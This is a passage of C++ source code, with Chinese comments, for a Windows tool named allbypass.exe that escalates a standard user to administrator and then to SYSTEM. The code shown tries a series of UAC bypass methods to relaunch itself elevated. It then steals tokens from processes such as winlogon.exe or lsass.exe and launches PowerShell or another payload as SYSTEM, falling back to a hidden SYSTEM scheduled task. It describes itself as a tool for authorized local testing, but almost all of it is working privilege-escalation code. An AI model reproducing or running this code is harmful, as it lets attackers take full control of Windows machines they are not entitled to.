        return fail("CreateProcessWithTokenW 失败");
    }
    logLine("OK", "已以 SYSTEM 身份拉起进程 PID=%lu", pi.dwProcessId);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return ok();
}

// ---------------------------------------------------------------------------
// 兜底:schtasks 建 SYSTEM 计划任务
// ---------------------------------------------------------------------------

/** 执行命令并等待结束,返回退出码。 */
DWORD runAndWait(const std::wstring &commandLine) {
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    std::wstring mutableCmd(commandLine);
    if (!CreateProcessW(nullptr, mutableCmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        return static_cast<DWORD>(-1);
    }
    WaitForSingleObject(pi.hProcess, 30000);
    DWORD code = static_cast<DWORD>(-1);
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return code;
}

/** 借 Task Scheduler 的壳跑命令(服务本身是 SYSTEM,必有权限)。

 *  注意:任务以 /ru SYSTEM 运行在**会话 0**,没有桌面,交互式窗口不可见。
 */
Result runViaTaskScheduler(const std::wstring &payloadCommandLine, bool keepTask) {
    const std::wstring taskName = widenAscii(TASK_NAME_PREFIX) +
                                  std::to_wstring(GetCurrentProcessId());

    wchar_t tempDir[MAX_PATH] = {0};
    if (GetTempPathW(MAX_PATH, tempDir) == 0) {
        return fail("GetTempPathW 失败");
    }
    // 用 wstring 拼接而非 swprintf:MinGW 按 ISO C 解释宽 printf 的 %s(当作 char*),
    // 传 wchar_t* 会在首个 0 字节处截断。
    const std::wstring scriptPath = std::wstring(tempDir) + L"allbypass_task_" +
                                    std::to_wstring(GetCurrentProcessId()) + L".cmd";

    // 命令写进临时 cmd 脚本 —— 直接塞进 /tr 会因引号嵌套而不可靠。
    FILE *fp = _wfopen(scriptPath.c_str(), L"wb");
    if (!fp) {
        return fail("无法创建临时脚本");
    }
    const std::string utf8 = toUtf8(payloadCommandLine.c_str());
    std::fprintf(fp, "@echo off\r\nchcp 65001 >nul\r\n%s\r\n", utf8.c_str());
    std::fclose(fp);
    logLine("INFO", "临时脚本: %s", toUtf8(scriptPath.c_str()).c_str());

    const std::wstring createCmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" +
                                   scriptPath + L"\" /sc once /st " + TASK_START_TIME +
                                   L" /ru SYSTEM /rl HIGHEST /f";
    if (runAndWait(createCmd) != 0) {
        DeleteFileW(scriptPath.c_str());
        return fail("schtasks /create 失败");
    }
    logLine("INFO", "已创建 SYSTEM 计划任务: %s", toUtf8(taskName.c_str()).c_str());

    const std::wstring runCmd = L"schtasks /run /tn \"" + taskName + L"\"";
    if (runAndWait(runCmd) != 0) {
        logLine("WARN", "schtasks /run 返回非 0");
    } else {
        logLine("OK", "SYSTEM 计划任务已触发");
    }

    Sleep(2000);

    if (!keepTask) {
        const std::wstring deleteCmd = L"schtasks /delete /tn \"" + taskName + L"\" /f";
        if (runAndWait(deleteCmd) == 0) {
            logLine("INFO", "已删除计划任务");
        } else {
            logLine("WARN", "删除计划任务失败,请手工执行: schtasks /delete /tn %s /f",
                    toUtf8(taskName.c_str()).c_str());
        }
        DeleteFileW(scriptPath.c_str());
    } else {
        logLine("WARN", "--keep 已指定,保留任务与脚本: %s",
                toUtf8(scriptPath.c_str()).c_str());
    }

    logLine("WARN", "注意:计划任务运行在会话 0,交互式窗口不会显示在桌面上");
    return ok();
}

// ---------------------------------------------------------------------------
// 验证
// ---------------------------------------------------------------------------

/** 构造验证产物路径(%TEMP%\ 下的 ASCII 文件名)。 */
std::wstring makeVerifyPath(const char *fileName) {
    wchar_t tempDir[MAX_PATH] = {0};
    if (GetTempPathW(MAX_PATH, tempDir) == 0) {
        return widenAscii(fileName);
    }
    return std::wstring(tempDir) + widenAscii(fileName);
}

/** 轮询验证文件,按给定特征串判断提权是否成功。 */
Result checkVerifyFile(const std::wstring &path, const char *needle, const char *successNote) {
    const DWORD deadline = GetTickCount() + VERIFY_TIMEOUT_MS;

    while (GetTickCount() < deadline) {
        FILE *fp = _wfopen(path.c_str(), L"rb");
        if (fp) {
            char buf[8192];
            const size_t got = std::fread(buf, 1, sizeof(buf) - 1, fp);
            buf[got] = '\0';
            std::fclose(fp);

            const std::string content(buf, got);
            if (content.find(needle) != std::string::npos) {
                logLine("OK", "%s", successNote);
                // 刻意保留验证文件 —— 这是提权成功的证据。
                logLine("INFO", "证据已保留: %s", toUtf8(path.c_str()).c_str());
                return ok();
            }
            if (!content.empty()) {
                logLine("ERROR", "载荷已执行,但未匹配特征 %s", needle);
                return fail("验证未通过");
            }
        }
        Sleep(VERIFY_POLL_MS);
    }
    return fail("验证超时,载荷没有被执行");
}

// ---------------------------------------------------------------------------
// 命令行重建
// ---------------------------------------------------------------------------

/** 按 Windows 命令行规则给参数加引号(CommandLineToArgvW 的逆运算)。 */
std::wstring quoteArg(const std::wstring &arg) {
    if (!arg.empty() && arg.find_first_of(L" \t\n\v\"") == std::wstring::npos) {
        return arg;
    }

    std::wstring out = L"\"";
    for (auto it = arg.begin();; ++it) {
        size_t backslashes = 0;
        while (it != arg.end() && *it == L'\\') {
            ++it;
            ++backslashes;
        }
        if (it == arg.end()) {
            // 结尾的反斜杠必须成对转义,否则会转义掉收尾引号。
            out.append(backslashes * 2, L'\\');
            break;
        }
        if (*it == L'"') {
            out.append(backslashes * 2 + 1, L'\\');
            out += L'"';
        } else {
            out.append(backslashes, L'\\');
            out += *it;
        }
    }
    out += L'"';
    return out;
}

/** 用给定参数列表拼出一条完整命令行。 */
std::wstring buildCommandLine(const std::vector<std::wstring> &args) {
    std::wstring line;
    for (size_t i = 0; i < args.size(); ++i) {
        if (i > 0) {
            line += L' ';
        }
        line += quoteArg(args[i]);
    }
    return line;
}

/** 取自身完整路径。 */
std::wstring selfPath() {
    wchar_t path[MAX_PATH] = {0};
    if (GetModuleFileNameW(nullptr, path, MAX_PATH) == 0) {
        return {};
    }
    return path;
}

void printUsage() {
    writeConsole(
        "allbypass.exe - 标准用户 -> 管理员 -> SYSTEM 两级提权(本地授权测试)\n"
        "\n"
        "用法: allbypass.exe [软件 [参数...]] [选项]\n"
        "\n"
        "  省略软件时默认以 SYSTEM 身份启动 powershell.exe\n"
        "\n"
        "选项:\n"
        "  --method=<名字>    UAC 手法,默认 auto 依次尝试全部\n"
        "  --list-tokens      列出当前可获取的令牌(账户/完整性/会话/来源进程)\n"
        "  --token=<选择器>   指定要获取的令牌身份,默认 SYSTEM\n"
        "                     选择器可为账户名、账户名尾段、SID 或进程名\n"
        "                     例:--token=SYSTEM | --token=lsass.exe | --token=S-1-5-19\n"
        "  --trustedinstaller 便捷写法:获取 NT SERVICE\\TrustedInstaller\n"
        "                     (会自动先启动 TrustedInstaller 服务)\n"
        "                     注意:较新的 Windows 上该服务已改为以 LocalSystem 运行,\n"
        "                     届时此身份无进程持有,应改用默认的 SYSTEM\n"
        "  --start-service=<名> 获取令牌前先启动的服务\n"
        "  --target=<进程名>  默认策略下的首选 SYSTEM 进程,默认 winlogon.exe\n"
        "  --fallback         令牌获取失败时改用 schtasks 兜底\n"
        "  --force-fallback   强制只走 schtasks 兜底\n"
        "  --verify           验证启动后的真实身份(与目标令牌 SID 比对)\n"
        "  --verify-uac       只验证到管理员即停止\n"
        "  --stop-at-admin    只提到管理员,不提权到其他身份\n"
        "  --keep             保留劫持项与计划任务(便于观察/取证)\n"
        "  --list             列出可用 UAC 手法\n"
        "  --help             显示本帮助\n");
}

void printMethods() {
    writeConsole("可用 UAC 手法:\n");
    for (size_t i = 0; i < UAC_METHOD_COUNT; ++i) {
        char line[256];
        std::snprintf(line, sizeof(line), "  %-17s -> %-45s %s\n", UAC_METHODS[i].name,
                      UAC_METHODS[i].trigger, UAC_METHODS[i].description);
        writeConsole(line);
    }
}

/** 列出当前可获取的令牌,并落盘一份清单。

 *  需要管理员 + SeDebugPrivilege,否则只能看到当前用户自己的进程。
 */
int listAvailableTokens() {
    if (!enablePrivilege(L"SeDebugPrivilege").success) {
        logLine("WARN", "SeDebugPrivilege 开启失败,清单可能不完整");
    }

    const std::vector<TokenInfo> tokens = enumerateTokens();
    const std::wstring outPath = makeVerifyPath(TOKEN_LIST_FILE);
    FILE *fp = _wfopen(outPath.c_str(), L"wb");

    std::string header = "  ";
    header += padToDisplayWidth("账户", 38);
    header += ' ';
    header += padToDisplayWidth("完整性", 8);
    header += ' ';
    header += padToDisplayWidth("会话", 5);
    header += ' ';
    header += padToDisplayWidth("可复制", 6);
    header += "  ";
    header += padToDisplayWidth("SID", 23);
    header += " 来源进程\n";

    writeConsole("可获取的令牌(按 身份+完整性级别 去重):\n");
    writeConsole(header.c_str());
    if (fp) {
        std::fputs(header.c_str(), fp);
    }

    for (const TokenInfo &t : tokens) {
        char session[32];
        std::snprintf(session, sizeof(session), "%lu", t.sessionId);

        std::string line = "  ";
        line += padToDisplayWidth(toUtf8(t.account.c_str()), 38);
        line += ' ';
        line += padToDisplayWidth(toUtf8(t.integrity.c_str()), 8);
        line += ' ';
        line += padToDisplayWidth(session, 5);
        line += ' ';
        line += padToDisplayWidth(t.duplicable ? "是" : "否", 6);
        line += "  ";
        line += padToDisplayWidth(toUtf8(t.sidString.c_str()), 23);
        line += ' ';
        line += toUtf8(t.processName.c_str());
        line += '\n';

        writeConsole(line.c_str());
        if (fp) {
            std::fputs(line.c_str(), fp);
        }
    }

    if (fp) {
        std::fclose(fp);
        logLine("INFO", "清单已落盘: %s", toUtf8(outPath.c_str()).c_str());
    }
    logLine("INFO", "共 %llu 个可获取身份。用 --token=<账户名|SID|进程名> 指定其一",
            static_cast<unsigned long long>(tokens.size()));
    return tokens.empty() ? 1 : 0;
}

// ---------------------------------------------------------------------------
// 两个阶段
// ---------------------------------------------------------------------------

/** 阶段 0:UAC 绕过,把自己以管理员身份重启。 */
int stageBypassUac(const std::vector<std::wstring> &originalArgs, const std::string &methodName,
                   bool keepRegistry, bool verifyUac) {
    std::string payloadUtf8;
    std::wstring hackPath;

    if (verifyUac) {
        hackPath = makeVerifyPath(VERIFY_FILE_ADMIN);
        payloadUtf8 = toUtf8((L"cmd.exe /c whoami /groups > \"" + hackPath + L"\" 2>&1").c_str());
        DeleteFileW(hackPath.c_str());
    } else {
        // 把原始参数原样带上,让提权后的实例进入阶段 1。
        std::vector<std::wstring> relaunch;
        relaunch.push_back(selfPath());
        for (const std::wstring &a : originalArgs) {
            relaunch.push_back(a);
        }
        payloadUtf8 = toUtf8(buildCommandLine(relaunch).c_str());
    }

    if (!verifyUac) {
        logLine("INFO", "阶段 0:UAC 绕过,以管理员身份重启自身");
    }
    logLine("INFO", "目标命令: %s", payloadUtf8.c_str());

    std::vector<const UacMethod *> candidates;
    if (methodName == "auto") {
        for (size_t i = 0; i < UAC_METHOD_COUNT; ++i) {
            candidates.push_back(&UAC_METHODS[i]);
        }
    } else {
        for (size_t i = 0; i < UAC_METHOD_COUNT; ++i) {
            if (methodName == UAC_METHODS[i].name) {
                candidates.push_back(&UAC_METHODS[i]);
            }
        }
        if (candidates.empty()) {
            logLine("ERROR", "未知 UAC 手法: %s", methodName.c_str());
            printMethods();
            return 2;
        }
    }

    for (const UacMethod *method : candidates) {
        const Result r = tryUacMethod(*method, payloadUtf8, keepRegistry);
        if (r.success) {
            if (verifyUac) {
                return checkVerifyFile(hackPath, SID_HIGH_INTEGRITY,
                                       "阶段 0 验证成功:已拿到高完整性管理员令牌")
                           .success
                       ? 0
                       : 1;
            }
            logLine("OK", "阶段 0 完成,提权后的实例已接管后续流程");
            return 0;
        }
        logLine("WARN", "手法 %s 未成功: %s", method->name, r.error ? r.error : "未知原因");
    }

    logLine("ERROR", "全部 UAC 手法均失败");
    return 1;
}

/** 阶段 1:管理员 -> SYSTEM。 */
/** 阶段 1 的参数集合。 */
struct AcquireOptions {
    std::wstring selector;       // 目标令牌选择器;为空则用默认策略(winlogon -> 扫 SYSTEM)
    std::wstring targetProcess;  // 默认策略下的首选进程名
    std::wstring startService;   // 获取令牌前先启动的服务(典型:TrustedInstaller)
    bool useFallback = false;
    bool forceFallback = false;
    bool keepTask = false;
    bool verify = false;
};

/** 阶段 1:获取指定身份的令牌并以该身份运行 payload。 */
int stageAcquireTokenAndRun(const std::wstring &payload, const AcquireOptions &opt) {
    // 先开日志:提权后的实例在独立控制台里跑,出问题只能靠日志文件定位。
    openStageLog();
    logLine("INFO", "阶段 1 日志已落盘(%%TEMP%%\\%s)", "allbypass_stage1.log");

    // 开启 SeDebugPrivilege 才能打开 winlogon 这类进程的令牌。
    const Result privResult = enablePrivilege(L"SeDebugPrivilege");
    if (!privResult.success) {
        logLine("ERROR", "开启 SeDebugPrivilege 失败: %s", privResult.error);
        return 1;
    }
    logLine("INFO", "已开启 SeDebugPrivilege");

    // 某些身份(如 TrustedInstaller)平时没有宿主进程,需要先把服务拉起来。
    if (!opt.startService.empty()) {
        if (!ensureServiceRunning(opt.startService).success) {
            logLine("WARN", "服务未能启动,仍继续尝试获取令牌");
        }
    }

    const std::wstring verifyPath = makeVerifyPath(VERIFY_FILE_SYSTEM);
    if (opt.verify) {
        DeleteFileW(verifyPath.c_str());
    }

    HANDLE hPrimaryToken = nullptr;
    std::wstring expectedSid = widenAscii(SID_LOCAL_SYSTEM);  // 默认期望 SYSTEM
    Result acquired = fail("未尝试");

    if (opt.forceFallback) {
        logLine("INFO", "--force-fallback 已指定,跳过令牌获取路线");
        acquired = fail("按参数要求跳过");
    } else if (!opt.selector.empty()) {
        // 按用户指定的选择器获取令牌。
        logLine("INFO", "阶段 1:获取指定令牌 —— %s", toUtf8(opt.selector.c_str()).c_str());
        TokenInfo info = {};
        // 等待窗口放宽:刚启动的服务需要时间才会出现宿主进程。
        acquired = acquireTokenBySelector(opt.selector, 8000, &hPrimaryToken, &info);
        if (acquired.success) {
            expectedSid = info.sidString;
            logLine("OK", "已复制令牌: %s", toUtf8(info.account.c_str()).c_str());
            logLine("INFO", "  完整性=%s  会话=%lu  来源=%s PID=%lu  SID=%s",
                    toUtf8(info.integrity.c_str()).c_str(), info.sessionId,
                    toUtf8(info.processName.c_str()).c_str(), info.pid,
                    toUtf8(info.sidString.c_str()).c_str());
        } else {
            logLine("WARN", "获取令牌失败: %s", acquired.error);
            // 把实际存在的身份列出来,便于改用 --token 指定。
            // 这一步能省掉大量猜测 —— 例如在新版 Windows 上
            // NT SERVICE\TrustedInstaller 已经没有任何进程持有(见 README)。
            logLine("INFO", "当前机器上实际可获取的身份:");
            for (const TokenInfo &t : enumerateTokens()) {
                logLine("INFO", "  %-34s [%-8s]%s", toUtf8(t.account.c_str()).c_str(),
                        toUtf8(t.integrity.c_str()).c_str(),
                        t.duplicable ? "" : "   <- 不允许复制");
            }
        }
    } else {
        // 默认策略:先试首选的 SYSTEM 进程,失败则遍历全部 SYSTEM 进程。
        logLine("INFO", "阶段 1:获取 SYSTEM 令牌(默认策略)");

        DWORD pid = 0;
        if (findPidByName(opt.targetProcess.c_str(), &pid)) {
            logLine("INFO", "找到 %s PID=%lu,尝试打开其令牌",
                    toUtf8(opt.targetProcess.c_str()).c_str(), pid);
            acquired = duplicateTokenFromPid(pid, true, &hPrimaryToken);
            if (!acquired.success) {
                logLine("WARN", "从 %s 获取失败: %s", toUtf8(opt.targetProcess.c_str()).c_str(),
                        acquired.error);
            }
        } else {
            acquired = fail("未找到目标进程");
            logLine("WARN", "未找到进程 %s", toUtf8(opt.targetProcess.c_str()).c_str());
        }

        if (!acquired.success) {
            // 目标被 PPL 保护或不存在时,遍历全部进程找一个能下手的。
            logLine("INFO", "改为遍历全部进程,寻找可打开令牌的 SYSTEM 进程...");
            wchar_t sourceName[MAX_PATH] = {0};
            acquired = scanForSystemProcess(&hPrimaryToken, sourceName, MAX_PATH, true);
            if (acquired.success) {
                logLine("INFO", "选中来源进程: %s", toUtf8(sourceName).c_str());
            }
        }
    }

    if (acquired.success) {
        const Result launched = createProcessWithToken(hPrimaryToken, payload);
        CloseHandle(hPrimaryToken);
        if (launched.success) {
            if (opt.verify) {
                // 用实际拿到的令牌 SID 作为比对特征 —— 这样验证的是"确实变成了目标身份",
                // 而不只是"确实提权了"。
                const std::string sid = toUtf8(expectedSid.c_str());
                logLine("INFO", "验证特征: %s", sid.c_str());
                return checkVerifyFile(verifyPath, sid.c_str(), "身份验证通过")
                           .success
                       ? 0
                       : 1;
            }
            logLine("OK", "令牌获取路线完成");
            return 0;
        }
        logLine("WARN", "拉起进程失败: %s", launched.error);
    } else {
        logLine("WARN", "令牌获取路线失败: %s", acquired.error);
    }

    if (!opt.useFallback) {
        logLine("ERROR", "主路线失败。可加 --fallback 改用 schtasks 兜底");
        return 1;
    }

    logLine("INFO", "兜底:schtasks 建 SYSTEM 计划任务");
    if (!runViaTaskScheduler(payload, opt.keepTask).success) {
        logLine("ERROR", "兜底路线也失败");
        return 1;
    }
    if (opt.verify) {
        return checkVerifyFile(verifyPath, toUtf8(expectedSid.c_str()).c_str(), "身份验证通过")
                   .success
               ? 0
               : 1;
    }
    return 0;
}

}  // namespace

int main() {
    int argc = 0;
    LPWSTR *argvW = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argvW) {
        std::fprintf(stderr, "CommandLineToArgvW failed\n");
        return 2;
    }

    std::vector<std::wstring> software;
    std::vector<std::wstring> originalArgs;
    AcquireOptions opt;
    opt.targetProcess = TARGET_PROCESS_DEFAULT;
    std::string methodName = "auto";
    bool keepRegistry = false;
    bool verifyUac = false;
    bool stopAtAdmin = false;
    bool listTokens = false;

    for (int i = 1; i < argc; ++i) {
        const std::wstring arg = argvW[i];
        originalArgs.push_back(arg);

        if (arg == L"--help" || arg == L"-h") {
            printUsage();
            LocalFree(argvW);
            return 0;
        }
        if (arg == L"--list") {
            printMethods();
            LocalFree(argvW);
            return 0;
        }
        if (arg == L"--list-tokens") {
            listTokens = true;
            continue;
        }
        if (arg == L"--fallback") {
            opt.useFallback = true;
            continue;
        }
        if (arg == L"--force-fallback") {
            opt.useFallback = true;
            opt.forceFallback = true;
            continue;
        }
        if (arg == L"--verify") {
            opt.verify = true;
            continue;
        }
        if (arg == L"--verify-uac") {
            verifyUac = true;
            stopAtAdmin = true;
            continue;
        }
        if (arg == L"--stop-at-admin") {
            stopAtAdmin = true;
            continue;
        }
        if (arg == L"--keep") {
            keepRegistry = true;
            opt.keepTask = true;
            continue;
        }
        if (arg == L"--trustedinstaller") {
            // 便捷写法:TrustedInstaller 平时没有宿主进程,需要先启动它的服务。
            opt.selector = L"NT SERVICE\\TrustedInstaller";
            opt.startService = L"TrustedInstaller";
            continue;
        }
        if (arg.rfind(L"--token=", 0) == 0) {
            opt.selector = arg.substr(8);
            continue;
        }
        if (arg.rfind(L"--start-service=", 0) == 0) {
            opt.startService = arg.substr(16);
            continue;
        }
        if (arg.rfind(L"--target=", 0) == 0) {
            opt.targetProcess = arg.substr(9);
            continue;
        }
        if (arg.rfind(L"--method=", 0) == 0) {
            methodName = toUtf8(arg.substr(9).c_str());
            continue;
        }
        if (arg.rfind(L"--", 0) == 0) {
            logLine("ERROR", "未知选项: %s", toUtf8(arg.c_str()).c_str());
            printUsage();
            LocalFree(argvW);
            return 2;
        }
        software.push_back(arg);
    }
    LocalFree(argvW);

    logLine("INFO", "allbypass 启动(标准用户 -> 管理员 -> 指定令牌身份)");

    if (isSystem()) {
        logLine("WARN", "当前进程已是 SYSTEM。");
        // 已是 SYSTEM 仍可用于列令牌或获取其它身份,不直接退出。
    }

    // ---- 阶段 0 ----
    if (!isElevated()) {
        return stageBypassUac(originalArgs, methodName, keepRegistry, verifyUac);
    }

    // ---- 阶段 1 ----
    logLine("INFO", "当前具备管理员权限,进入阶段 1");

    if (stopAtAdmin) {
        logLine("OK", "已按要求停在管理员权限(--stop-at-admin)");
        return 0;
    }

    if (listTokens) {
        return listAvailableTokens();
    }

    if (software.empty()) {
        software.push_back(DEFAULT_TARGET_SOFTWARE);
    }

    std::wstring payload;
    const std::wstring verifyPath = makeVerifyPath(VERIFY_FILE_SYSTEM);
    if (opt.verify) {
        // whoami /user 的 SID 能直接反映实际身份,便于与目标令牌 SID 比对。
        payload = L"cmd.exe /c whoami /user > \"" + verifyPath + L"\" 2>&1";
    } else {
        payload = buildCommandLine(software);
    }
    logLine("INFO", "目标命令: %s", toUtf8(payload.c_str()).c_str());

    return stageAcquireTokenAndRun(payload, opt);
}
